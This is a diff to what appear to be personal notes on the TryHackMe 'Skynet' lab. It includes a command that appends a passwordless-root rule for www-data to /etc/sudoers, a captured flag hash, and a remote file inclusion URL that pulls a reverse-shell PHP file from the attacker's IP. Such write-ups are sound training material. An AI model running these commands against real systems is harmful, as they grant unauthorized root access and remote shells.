@@ -166,6 +166,19 @@ Link: https://medium.com/azkrath/tryhackme-walkthrough-skynet-69399702ee5a
 
 echo ‘echo “www-data ALL=(root) NOPASSWD: ALL” >> /etc/sudoers’ > sudo.sh
 
+![](../../img/Pasted%20image%2020220827231206.png)
+
+Then patiently wait after 1 minute, then perform sudo su, and check for whoami:
+
+![](../../img/Pasted%20image%2020220827231233.png)
+
+Flag.txt
+3f0372db24753accc7179a282cd6a949
+
+
+END
+
+Draft:
 
 http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.109.169/rshell.php
 
